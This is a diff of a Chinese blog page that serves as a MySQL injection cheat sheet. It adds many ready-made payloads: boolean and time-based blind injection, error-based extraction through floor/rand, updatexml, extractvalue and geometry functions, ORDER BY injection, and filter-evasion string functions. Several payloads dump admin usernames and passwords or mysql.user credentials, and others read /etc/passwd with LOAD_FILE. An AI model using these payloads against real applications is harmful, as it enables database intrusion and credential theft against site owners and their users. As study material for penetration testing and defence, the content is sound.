@@ -112,20 +112,20 @@
 
 
 
-<meta name="description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta name="description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 常量：true， false， null， \N, current_timestamp变量：@myvar:=1系统变量：@@version, @@datadir….常用函数：version(), pi(), pow(), char(), substring()字符串生成：hex(), conv()有关于字符串生成的一些基">
 <meta name="keywords" content="Mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MySql注入(基础)">
 <meta property="og:url" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/index.html">
 <meta property="og:site_name" content="KidHat">
-<meta property="og:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta property="og:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 常量：true， false， null， \N, current_timestamp变量：@myvar:=1系统变量：@@version, @@datadir….常用函数：version(), pi(), pow(), char(), substring()字符串生成：hex(), conv()有关于字符串生成的一些基">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/dns.png">
 <meta property="og:image" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/smb.png">
-<meta property="og:updated_time" content="2017-11-07T14:37:15.739Z">
+<meta property="og:updated_time" content="2017-11-09T15:36:58.481Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySql注入(基础)">
-<meta name="twitter:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta name="twitter:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 常量：true， false， null， \N, current_timestamp变量：@myvar:=1系统变量：@@version, @@datadir….常用函数：version(), pi(), pow(), char(), substring()字符串生成：hex(), conv()有关于字符串生成的一些基">
 <meta name="twitter:image" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/dns.png">
 
 
@@ -389,6 +389,7 @@
 
       
         <p>原文：<a href="http://blog.sycsec.com/?p=1005" target="_blank" rel="external">MySQL注入攻击与防御</a><br>在原文章的基础上做了些整理方便自己的知识整理。</p>
+<p>常量：true， false， null， \N, current_timestamp变量：@myvar:=1<br>系统变量：@@version, @@datadir….<br>常用函数：version(), pi(), pow(), char(), substring()<br>字符串生成：hex(), conv()<br>有关于字符串生成的一些基础字符：true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6</p>
 <h1 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h1><p>可以用以下语句对一个可能的注入点进行测试</p>
 <table>
 <thead>
@@ -473,47 +474,6 @@
 </tbody>
 </table>
 <p>Examples:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM Users WHERE username = &apos;&apos;; OR 1=1 -- -AND password = &apos;&apos;;</div><div class="line">SELECT * FROM Users WHERE id = &apos;&apos; UNION SELECT 1, 2, 3`;</div></pre></td></tr></table></figure></p>
-<h1 id="版本-amp-主机名-amp-用户-amp-库名"><a href="#版本-amp-主机名-amp-用户-amp-库名" class="headerlink" title="版本&amp;主机名&amp;用户&amp;库名"></a>版本&amp;主机名&amp;用户&amp;库名</h1><table>
-<thead>
-<tr>
-<th style="text-align:center"><strong>版本</strong></th>
-<th style="text-align:center"><strong>主机名</strong></th>
-<th style="text-align:center"><strong>用户</strong></th>
-<th style="text-align:center"><strong>库名</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">VERSION()</td>
-<td style="text-align:center">@@HOSTNAME</td>
-<td style="text-align:center">user()</td>
-<td style="text-align:center">database()</td>
-</tr>
-<tr>
-<td style="text-align:center">@@VERSION</td>
-<td style="text-align:center"></td>
-<td style="text-align:center">Current<em>user()</em></td>
-<td style="text-align:center">SELECT schema_name FROM information_schema.schemata;</td>
-</tr>
-<tr>
-<td style="text-align:center">@@GLOBAL.VERSION</td>
-<td style="text-align:center"></td>
-<td style="text-align:center">System_user()</td>
-<td style="text-align:center">SELECT DISTINCT(db) FROM mysql.db;–</td>
-</tr>
-<tr>
-<td style="text-align:center">/<em>!mysql版本号</em>/（/<em>!50094eaea</em>/）当数字小于版本号时返回TRUE</td>
-<td style="text-align:center"></td>
-<td style="text-align:center">Session_user()</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">SELECT * FROM Users WHERE id = &#39;1&#39; AND MID(VERSION(),1,1) = &#39;5&#39;;</td>
-<td style="text-align:center"></td>
-<td style="text-align:center">SELECT CONCATWS(0x3A, user, password) FROM mysql.user WHERE user = &#39;root&#39;–</td>
-</tr>
-</tbody>
-</table>
 <h1 id="表和字段"><a href="#表和字段" class="headerlink" title="表和字段"></a>表和字段</h1><h2 id="确定字段数"><a href="#确定字段数" class="headerlink" title="确定字段数"></a>确定字段数</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>ORDER BY用于判断表中的字段个数</p>
 <table>
 <thead>
@@ -541,7 +501,7 @@
 </tr>
 <tr>
 <td>-1′ UNION SELECT 1,2,3–+</td>
-<td>True</td>
+<td>True (如果没有可以用的回显位置的话，那就不能用union注入了)</td>
 </tr>
 </tbody>
 </table>
@@ -619,8 +579,8 @@
 <tbody>
 <tr>
 <td>-1&#39; UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema=database()</td>
-<td>AND SELECT SUBSTR(table<em>name,1,1) FROM information__schema.tables &gt; &#39;A&#39;</em></td>
-<td>1+and(select 1 from(select count(_),concat((select (select (SELECT distinct concat(0x7e,table_n_ame,0x7e) FROM information<strong>schema.tables where table</strong>schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)_2))x from information_schema.tables group by x)a)</td>
+<td>AND SELECT SUBSTR(table_name,1,1) FROM information<em>schema.tables &gt; &#39;A&#39;</em></td>
+<td>1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</td>
 </tr>
 </tbody>
 </table>
@@ -638,34 +598,60 @@
 <tr>
 <td>UNION SELECT GROUP_CONCAT<br>(column_name) FROM information_schema.<br>columns WHERE table_name = &#39;table_name&#39; 可以不使用单引号，用16进制</td>
 <td>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &#39;A&#39;</td>
-<td>1+and(select 1 from(select count(_),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)_2))x from information_schema.tables group by x)a)</td>
-<td>1 LIMIT 1,1 PROCEDURE ANALYSE() 获取到第二个字段名</td>
+<td>1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_<br>schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</td>
+<td>LIMIT下注入:<br>1 LIMIT 1,1 PROCEDURE ANALYSE()获取到第二个字段名<br>1 LIMIT 1,1 procedure analyse(extractvalue(rand(),<br>concat(0x3a,version())),1)爆出版本</td>
 </tr>
 </tbody>
 </table>
-<h1 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h1><p>下面的几条语句都可以用以连接字符</p>
-<table>
+<h1 id="版本-amp-主机名-amp-用户-amp-库名"><a href="#版本-amp-主机名-amp-用户-amp-库名" class="headerlink" title="版本&amp;主机名&amp;用户&amp;库名"></a>版本&amp;主机名&amp;用户&amp;库名</h1><table>
 <thead>
 <tr>
-<th><strong>字符串连接方式</strong></th>
+<th style="text-align:center"><strong>版本</strong></th>
+<th style="text-align:center"><strong>主机名</strong></th>
+<th style="text-align:center"><strong>用户</strong></th>
+<th style="text-align:center"><strong>库名</strong></th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>SELECT &#39;a&#39; &#39;d&#39; &#39;mi&#39; &#39;n&#39;;</td>
+<td style="text-align:center">VERSION()</td>
+<td style="text-align:center">@@HOSTNAME</td>
+<td style="text-align:center">user()</td>
+<td style="text-align:center">database()</td>
 </tr>
 <tr>
-<td>SELECT CONCAT(&#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</td>
+<td style="text-align:center">@@VERSION</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">Current<em>user()</em></td>
+<td style="text-align:center">SELECT schema_name FROM information_schema.schemata;</td>
 </tr>
 <tr>
-<td>SELECT CONCAT<em>WS(&#39;&#39;, &#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</em></td>
+<td style="text-align:center">@@GLOBAL.VERSION</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">System_user()</td>
+<td style="text-align:center">SELECT DISTINCT(db) FROM mysql.db;–</td>
 </tr>
 <tr>
-<td>SELECT GROUP_CONCAT(&#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</td>
+<td style="text-align:center">/!mysql版本号/（/!50094eaea/）当数字小于版本号时返回TRUE</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">Session_user()</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SELECT * FROM Users WHERE id = &#39;1&#39; AND MID(VERSION(),1,1) = &#39;5&#39;;</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = &#39;root&#39;–</td>
 </tr>
 </tbody>
 </table>
-<h1 id="条件语句-amp-时间函数"><a href="#条件语句-amp-时间函数" class="headerlink" title="条件语句&amp;时间函数"></a>条件语句&amp;时间函数</h1><table>
+<h1 id="基于布尔注入"><a href="#基于布尔注入" class="headerlink" title="基于布尔注入"></a>基于布尔注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">URL and (select count(username)from admin)&gt;0   //猜解数据库列名，还可以猜解数据类型</div><div class="line">URL and (select length(username) from admin limit 1)&gt;0  //猜解数据库列名长度：修改后面的&gt;0是猜解长度 </div><div class="line">URL and (select top 1 ascii(substring(username 1,1)) from admin)&gt;0 //猜解内容：</div><div class="line">?id=1’ and exists(select * from information_schema.tables) --+</div><div class="line">?id=’ and (select length(version()))=6 --+ #判断version()返回字符串长度</div><div class="line">?id=1’ and (select count(distinct+table_schema)from information_schema.tables)&gt;10 --+ #判断有多少个库</div><div class="line">?id=1’ and(select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1),1,1)))&gt;100 --+ #判断第一个数据库的第 一个字符</div></pre></td></tr></table></figure>
+<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><ol>
+<li><p>判断是否存在时间盲注<br>union形式（如果效果不明显可以再两个0）：id=1’ union select 1,benchmark(10000000,md5(“test”)) –+<br>boolen形式：id=1’ and sleep(5) –+</p>
+</li>
+<li><p>爆数据库：<br>具体过程和布尔型盲注相仿。</p>
+</li>
+</ol>
+<h2 id="条件语句-amp-时间函数"><a href="#条件语句-amp-时间函数" class="headerlink" title="条件语句&amp;时间函数"></a>条件语句&amp;时间函数</h2><table>
 <thead>
 <tr>
 <th><strong>条件语句</strong></th>
@@ -699,6 +685,54 @@
 </tbody>
 </table>
 <p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
+<h1 id="MySql报错注入"><a href="#MySql报错注入" class="headerlink" title="MySql报错注入"></a>MySql报错注入</h1><p><a href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/" target="_blank" rel="external">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),ﬂ oor(rand(0)*2))x from information_schema.tables group by x)a) --获取版本号</div><div class="line"> </div><div class="line"> /sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),ﬂoor(rand(0)*2))x from information_schema.tables group by x)a) --获取数据库</div><div class="line"></div><div class="line"> /sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),ﬂoor(rand(0)*2))x from information_schema.tables group by x)a)--获取表名字</div><div class="line"></div><div class="line"> /sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),ﬂoor(rand(0)*2))x from information_schema.tables group by x)a) --获取字段名称</div><div class="line"></div><div class="line"> /sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),ﬂoor(rand(0)*2))x from information_schema.tables group by x)a) --获取内容</div></pre></td></tr></table></figure></p>
+<p>1.floor()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div></pre></td></tr></table></figure></p>
+<p>2.extractvalue()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</div></pre></td></tr></table></figure></p>
+<p>3.updatexml()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div></pre></td></tr></table></figure></p>
+<p>4.geometrycollection()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure></p>
+<p>5.multipoint()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure></p>
+<p>6.polygon()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure></p>
+<p>7.multipolygon()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure></p>
+<p>8.linestring()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure></p>
+<p>9.multilinestring()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure></p>
+<p>10.exp()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from test where id=1 and exp(~(select * from(select user())a));</div></pre></td></tr></table></figure></p>
+<h1 id="Order-by-注入"><a href="#Order-by-注入" class="headerlink" title="Order by 注入"></a>Order by 注入</h1><p><a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="external">https://www.secpulse.com/archives/57197.html</a><br>select * from goods order by $_GET[‘order’]，order by 后的数字可以作为一个注入点。</p>
+<p>这里可以用一些判断和返回值进行利用，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/?order=IF(1=1,name,price) 通过name字段排序 </div><div class="line">/?order=IF(1=2,name,price) 通过price字段排序</div><div class="line">/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序 </div><div class="line">/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序</div><div class="line">/?order=IFNULL(NULL,price) 通过price字段排序 </div><div class="line">/?order=IFNULL(NULL,name) 通过name字段排序</div><div class="line">/?order=rand(1=1) /?order=rand(1=2)</div></pre></td></tr></table></figure></p>
+<p>通常这里我们是不知道列名的，那可以通过报错进行利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">/?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常 </div><div class="line">/?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误  </div><div class="line">利用regexp </div><div class="line">/?order=(select+1+regexp+if(1=1,1,0x00)) 正常 </div><div class="line">/?order=(select+1+regexp+if(1=2,1,0x00)) 错误  </div><div class="line">利用updatexml </div><div class="line">/?order=updatexml(1,if(1=1,1,user()),1) 正确 </div><div class="line">/?order=updatexml(1,if(1=2,1,user()),1) 错误  </div><div class="line">利用extractvalue </div><div class="line">/?order=extractvalue(1,if(1=1,1,user())) 正确 </div><div class="line">/?order=extractvalue(1,if(1=2,1,user())) 错误 </div><div class="line"></div><div class="line">/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间</div><div class="line">/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒</div><div class="line"></div><div class="line">[猜当前库表名]</div><div class="line">/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00)) 正确</div><div class="line">/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误</div><div class="line">[猜指定表的列名]</div><div class="line">/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常</div><div class="line">/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误</div></pre></td></tr></table></figure></p>
+<h1 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h1><p>下面的几条语句都可以用以连接字符</p>
+<table>
+<thead>
+<tr>
+<th><strong>字符串连接方式</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT &#39;a&#39; &#39;d&#39; &#39;mi&#39; &#39;n&#39;;</td>
+</tr>
+<tr>
+<td>SELECT CONCAT(&#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</td>
+</tr>
+<tr>
+<td>SELECT CONCAT<em>WS(&#39;&#39;, &#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</em></td>
+</tr>
+<tr>
+<td>SELECT GROUP_CONCAT(&#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</td>
+</tr>
+</tbody>
+</table>
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="GROUP-CONCAT"><a href="#GROUP-CONCAT" class="headerlink" title="GROUP_CONCAT"></a><strong>GROUP_CONCAT</strong></h2><p>将相同的行组合起来.返回带有来自一个组的连接的非NULL值的字符串结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GROUP_CONCAT([DISTINCT] expr [,expr ...]</div><div class="line">		[ORDER BY &#123;unsigned_integer | col_name | expr&#125;</div><div class="line">		[ASC | DESC] [,col_name ...]]</div><div class="line">		[SEPARATOR str_val])</div></pre></td></tr></table></figure></p>
+<p><code>select * from aa;</code><br>+——+——+<br>| id| name |<br>+——+——+<br>|1 | 10|<br>|1 | 20|<br>|1 | 20|<br>|2 | 20|<br>+——+——+<br>4 rows in set (0.00 sec)<br><code>select id,group_concat(name) from aa group by id;</code><br>+——+——————–+<br>| id| group_concat(name) |<br>+——+——————–+<br>|1 | 10,20,20|<br>|2 | 20 |<br>+——+——————–+<br>2 rows in set (0.00 sec)</p>
+<h2 id="COUNT"><a href="#COUNT" class="headerlink" title="COUNT"></a><strong>COUNT</strong></h2><p>COUNT(*)函数计算行数<br><code>mysql&gt; SELECT COUNT(*) FROM pet;</code><br>+———-+<br>| COUNT(*) |<br>+———-+<br>|        9 |<br>+———-+</p>
+<h2 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a><strong>LIMIT</strong></h2><p> LIMIT子句可以被用于强制 SELECT 语句返回指定的记录数<br><code>mysql&gt; SELECT * FROM table LIMIT 5,10;</code>  // 检索记录行 6-15</p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a><strong>floor</strong></h2><p>函数只返回整数部分，小数部分舍弃<br>mysql&gt; select floor(3.2);<br>+————+<br>| floor(3.2) |<br>+————+<br>|          3 |<br>+————+</p>
+<h2 id="RAND"><a href="#RAND" class="headerlink" title="RAND"></a><strong>RAND</strong></h2><p>产生随机数，rand()可以在0和1之间产生一个随机数<br>mysql&gt; select rand();<br>+———————+<br>| rand()              |<br>+———————+<br>| 0.16757944986930065 |<br>+———————+</p>
+<p>mysql&gt; select rand();<br>+——————–+<br>| rand()             |<br>+——————–+<br>| 0.4473912617633038 |<br>+——————–+<br>RAND()会产生一个可重复的一系列数字,rand(n)会重复产生一个值</p>
+<h1 id="不常用函数绕过滤"><a href="#不常用函数绕过滤" class="headerlink" title="不常用函数绕过滤"></a>不常用函数绕过滤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lpad(data,1,space(1)) </div><div class="line">lpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;??hi&apos; rpad(data,1,space(1))</div><div class="line">rpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;hi??&apos; </div><div class="line">left(data,1) </div><div class="line">reverse(right(reverse(data),1)) </div><div class="line">insert(insert(version(),1,0,space(0)),2,222,space(0))</div></pre></td></tr></table></figure>
+<p>3.2 搜索匹配类的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&apos;-if(locate(&apos;f&apos;,data),1,0)# </div><div class="line">&apos;-if(locate(&apos;fo&apos;,data),1,0)# </div><div class="line">&apos;-if(locate(&apos;foo&apos;,data),1,0)# </div><div class="line">instr(), position()</div></pre></td></tr></table></figure>
+<p>3.4、使用函数进行字符串的切割</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">length(trim(leading &apos;a&apos; FROM data)) # </div><div class="line">length will be shorter </div><div class="line">length(replace(data, &apos;a&apos;, &apos;&apos;)) # </div><div class="line">length will be shorter</div></pre></td></tr></table></figure>
 <h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h2><p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
 <blockquote>
 <ol>
@@ -731,7 +765,7 @@
 </table>
 <h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读文件函数LOAD_FILE()</p>
 <p>Examples:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD\_FILE(&apos;/etc/passwd&apos;);</div><div class="line">SELECT LOAD\_FILE(0x2F6574632F706173737764);</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(&apos;/etc/passwd&apos;);</div><div class="line">SELECT LOAD_FILE(0x2F6574632F706173737764);</div></pre></td></tr></table></figure>
 <p>注意点：</p>
 <ol>
 <li>LOAD_FILE的默认目录@@datadir</li>
@@ -956,7 +990,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#测试注入"><span class="nav-number">1.</span> <span class="nav-text">测试注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注释符"><span class="nav-number">2.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#版本-amp-主机名-amp-用户-amp-库名"><span class="nav-number">3.</span> <span class="nav-text">版本&主机名&用户&库名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#表和字段"><span class="nav-number">4.</span> <span class="nav-text">表和字段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#确定字段数"><span class="nav-number">4.1.</span> <span class="nav-text">确定字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ORDER-BY"><span class="nav-number">4.1.1.</span> <span class="nav-text">ORDER BY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SELECT-…-INTO"><span class="nav-number">4.1.2.</span> <span class="nav-text">SELECT … INTO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断已知表名的字段数"><span class="nav-number">4.1.3.</span> <span class="nav-text">判断已知表名的字段数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查表名"><span class="nav-number">4.2.</span> <span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查列名"><span class="nav-number">4.3.</span> <span class="nav-text">查列名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符串连接"><span class="nav-number">5.</span> <span class="nav-text">字符串连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#条件语句-amp-时间函数"><span class="nav-number">6.</span> <span class="nav-text">条件语句&时间函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件操作"><span class="nav-number">7.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作权限"><span class="nav-number">7.1.</span> <span class="nav-text">文件操作权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-number">7.2.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-number">7.3.</span> <span class="nav-text">写文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#带外通道"><span class="nav-number">8.</span> <span class="nav-text">带外通道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是带外通道注入？"><span class="nav-number">8.1.</span> <span class="nav-text">什么是带外通道注入？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件限制"><span class="nav-number">8.2.</span> <span class="nav-text">条件限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS注入"><span class="nav-number">8.3.</span> <span class="nav-text">DNS注入</span></a></li><li class="nav-item nav-level-2"><a 